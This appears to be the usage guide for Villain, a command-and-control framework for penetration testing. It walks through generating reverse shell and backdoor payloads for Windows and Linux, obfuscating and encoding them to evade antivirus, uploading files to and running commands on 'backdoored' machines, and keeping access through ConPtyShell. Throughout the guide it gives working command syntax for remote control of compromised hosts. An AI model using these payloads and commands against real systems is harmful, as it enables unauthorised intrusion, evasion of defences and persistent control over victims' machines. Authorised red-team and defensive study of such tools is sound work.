# Usage Guide
:warning: Villain was explicitly developed and tested on **kali linux**.  
:warning: This guide is a work in progress currently describing key features. Check out Villain's introduction on youtube for more info.

## Table of contents
1. [Generate Backdoor Payloads](#Generate-Reverse-Shell-Commands)
2. [Connect With Sibling Server](#Connect-With-Sibling-Server)
3. [The shell Command](#The-shell-Command)
4. [The upload Command](#The-upload-Command)
5. [The conptyshell Command](#The-conptyshell-Command)
6. [The exec Command](#The-exec-Command)
7. [Chat with Sibling Servers](#Chat-with-Sibling-Servers)
8. [Session Defender](#Session-Defender)

## Generate Reverse Shell Commands
Use the `generate` prompt command to generate payloads for Windows / Linux machines. 
In the latest Villain release, this function was redesigned to use payload templates (files). In `Core/payload_templates/<OS>/<HANDLER>/` you can find these templates, edit them, make your own, etc. Ultimately, you should replace the predefined Windows reverse shell commands with obfuscated versions. That way you can create a personalized instance of Villain and deal with AV evasion in a more productive and efficient way. Here's how 📽️ -> [youtube.com/watch?v=grSBdZdUya0](https://www.youtube.com/watch?v=grSBdZdUya0)  

Main logic:
```
generate payload=<OS_TYPE/HANDLER/PAYLOAD_TEMPLATE> lhost=<IP or INTERFACE> [ obfuscate encode ]
```

Usage examples:
```
generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode
generate payload=linux/hoaxshell/sh_curl lhost=eth0
```

- The ENCODE and OBFUSCATE keywords are enabled for certain templates and can be used during payload generation. 
- For info on a particular template, use "generate" with PAYLOAD being the only provided argument.
- To catch HoaxShell https-based reverse shells you need to start Villain with SSL.

⚡TCP socket based shells (netcat) are more stable and reliable than HoaxShell.
⚠️HoaxShell payloads are not reusable (will work only once). I will probably change that in the future.

Use the prompt commands `backdoors` and `sessions` to list info about your active shell sessions.

## Connect With Sibling Server
Use the `connect` prompt command to connect and share your shell sessions with another machine running Villain. 
```
connect <IP> <TEAM SERVER PORT>
```
By default, the Core server port is `65001` (you can change that with `-p` when starting Villain).

## The shell Command
Use the `shell` prompt command to start an interactive pseudo-shell for a shell session. The effectiveness of the pseudo shell is going to vary depending on the quality and stability of the shell session. Again, you should prefer TCP socket based shells as they will always be more stable than HoaxShell.
```
shell <SESSION ID or ALIAS>
```
Press Ctrl + C or type `exit` to return to the main Villain prompt.

## The upload Command
Use the `upload` to transfer a file from your system to a backdoored machine. The file will be http requested automatically from the Http File Smuggler (running by default on port 8888). The feature works regardless if the session is owned by you or a sibling server. You can run the command from Villain's main prompt as well as the pseudo shell terminal.

From the main prompt:
```
upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH> <SESSION ID or ALIAS>
```

From an active pseudo shell prompt:
```
upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH>
```

## The conptyshell Command
Use the `conptyshell` to automatically slap `Invoke-ConPtyShell.ps1` against a shell session. A new terminal window with netcat listening will pop up (you need to have gnome-terminal installed) and the script will be executed on the target as a new process, meaning you get a fully interactive shell AND you get to keep your backdoor. Currently works only for powershell.exe backdoors.
Because I love Invoke-ConPtyShell.

Usage: 
```
conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>
```

## The exec Command
Use the `exec` prompt command to execute a **quoted command** or **script from your file system** against a session. Files are executed by being http requested from the Http File Smuggler. Be carefull! The script you execute should much the shell session type (e.g., a PowerShell script script should be executed against a powershell.exe session, etc).  

Usage: 
```
exec </path/to/local/file> <SESSION ID or ALIAS>
exec 'net user;Get-Date' <SESSION ID or ALIAS>
```

## Chat with Sibling Servers
Commands starting with "#" are interpreted as messages and will be broadcasted to all connected Sibling Servers.

## Session Defender
Villain has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). Use the `cmdinspector` command to turn that feature on/off.  

Usage: 
```
cmdinspector <ON/OFF>
```

